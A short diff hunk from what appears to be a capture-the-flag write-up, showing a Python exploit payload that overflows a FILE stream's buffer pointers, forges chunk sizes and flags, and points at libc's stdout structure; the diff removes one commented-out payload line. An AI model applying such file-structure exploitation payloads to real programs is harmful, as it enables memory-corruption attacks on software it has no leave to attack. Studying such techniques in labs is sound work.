@@ -82,7 +82,6 @@ Next I  overwrote (is that how you say it??) the write file structure to point t
 ``` python
     # buf base and buf end overflow on the write stream 
     payload = b"A"*0x28 + p64(0x1e1) + b"B"*0x1d8 + p64(0x1e1) 
-    #payload = b"A" * 0x208 + p64(0x1e1)
     payload += p64(0xfbad2c84)
     payload += p64(l.sym["_IO_2_1_stdout_"] + libc)
     payload += p64(0) * 5
